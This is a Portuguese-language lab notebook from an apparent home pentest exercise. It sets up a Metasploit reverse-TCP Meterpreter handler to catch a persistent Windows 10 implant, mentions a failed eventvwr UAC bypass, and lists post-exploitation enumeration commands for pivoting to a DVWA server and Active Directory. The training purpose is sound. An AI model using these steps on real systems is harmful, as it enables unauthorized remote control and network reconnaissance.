Apos ganhar o acesso  a máquina win 10 na faze 03, a máquina foi desligada, e nessa próxima faze , o primeito passo é iniciar a vm debian 12RED, e no terminal

1. Terminal 1: O Receptor (Handler)
Este terminal ficará esperando a conexão que o Windows vai enviar automaticamente por causa da persistência que criamos no registro.

Bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.143
set LPORT 4444
set ExitOnSession false
exploit -j
Nota: O -j serve para rodar como um "job" em segundo plano. Assim, se a conexão cair e voltar, o Metasploit continua ouvindo sem você precisar digitar nada.


## 🛠️ Passo a Passo para entrar no Shell:
Liste as sessões ativas:
Digite o comando para ver se o seu Windows 10 já se conectou de volta:

Bash
```
sessions
```

Interaja com a sessão:
Se aparecer uma sessão (ex: ID 1), entre nela:

Bash
```
    sessions -i 1
```

3.  **Agora sim, peça o Shell:**
    Quando o prompt mudar para `meterpreter >`, aí você digita:
    
```bash
    shell
```

---
### 2. Terminal 2: Monitoramento de Rede (Opcional, mas Pro)

Enquanto o Windows inicia, é legal ver se ele está tentando "conversar" com o seu IP. Isso é excelente para o seu relatório no Obsidian.

Bash

```
sudo tcpdump -i eth0 port 4444
```


_(Troque `eth0` pelo nome da sua interface de rede se for diferente, como `ens33` ou `enp0s3`)._

---

"Fase 04.1: Elevação de Privilégio Técnica. Antes de prosseguir com a enumeração profunda do host, é necessário transpor a barreira do UAC para garantir visibilidade total sobre o sistema de arquivos e processos protegidos."


como tivemos um baile na escala de privilégio, vamos fazer a enum sem privilégios mesmo rsrs 

### 1. Limpeza do Ambiente e Retorno à Sessão

Para sair do módulo de exploit e voltar para a sua sessão ativa de forma limpa:

1. **Saia do módulo `eventvwr`:**
    
    - Digite `back` e aperte **Enter**. O prompt mudará de `msf exploit(...) >` para apenas `msf6 >`.
        
2. **Limpe a tela do terminal:**
    
    - Pressione **Ctrl + L** (isso limpa visualmente o terminal do Debian).
        
3. **Interaja com a Sessão 1 (Windows 10):**
    
    - Digite `sessions -i 1` e aperte **Enter**.
        
4. **Limpe o buffer do Meterpreter:**
    
    - Pressione **Ctrl + L** novamente. Agora você tem um prompt `meterpreter >` limpo para começar.

## 2.Enumeração de Sistema (O essencial para o Relatório)
Documente estes comandos no seu configuração.md. Eles formam a base do seu relatório de Post-Exploitation.

Comando: sysinfo

O que extrair: Nome do computador, versão exata do SO (Build) e arquitetura.

Comando: getuid

O que extrair: Confirmação de que você está operando como o usuário comum (ex: vboxuser).

### 3. Enumeração de Rede e Descoberta de Vizinhos

Como seu objetivo é pular para o **Server Apache/DVWA** e o **ADDS**, este é o passo mais importante.

- **Comando:** `ipconfig`
    
    - **O que extrair:** O IP interno do Windows 10 e a máscara de sub-rede.
        
- **Comando:** `arp`
    
    - **O que extrair:** A tabela ARP. Aqui você verá os IPs das outras máquinas que o Windows 10 já "conversou" (provavelmente seu Server e o ADDS).
        
- **Comando:** `run post/windows/gather/enum_network`
    
    - **O que extrair:** Este script do Metasploit faz um levantamento completo de interfaces, rotas e conexões ativas.
        

---

### 4. Enumeração de Ambiente e Usuários

Para o portfólio no Obsidian, é bom mostrar que você sabe quem mais está na máquina.

- **Comando:** `shell` (entre no prompt do Windows)
    
- **Comando Windows:** `net user` (lista usuários locais)
    
- **Comando Windows:** `net localgroup administrators` (vê quem são os admins, mesmo que você não seja um deles ainda)
    
- **Comando Windows:** `systeminfo | findstr /B /C:"OS Name" /C:"OS Version"` (detalha o sistema para o relatório)
    
- **Sair do Shell:** Digite `exit` para voltar ao Meterpreter.
    

---



## 🛠️ Passo 1: Saindo das Sessões Ativas
Antes de fechar o programa, é boa prática sair das interações de forma limpa:

Sair do Shell do Windows:

Digite exit e aperte Enter. Você voltará para o prompt meterpreter >.

Colocar a Sessão em Background:

Digite background ou pressione Ctrl + Z e confirme com y. Você voltará para o prompt msf exploit(multi/handler) >.

🛠️ Passo 2: Encerrando o Metasploit
Para fechar o console completamente:

Digite exit novamente no prompt do MSF.

Isso encerrará o msfconsole e voltará para o terminal do seu Debian.

[!IMPORTANT]
Nota técnica: Ao fechar o Metasploit, as suas sessões ativas (Sessão 1, 2, etc.) serão encerradas no seu lado. No entanto, como você tem a persistência instalada no Windows 10, assim que você abrir o Metasploit novamente e ligar o multi/handler, a máquina alvo tentará se conectar de volta automaticamente (ou após o tempo de intervalo que você configurou).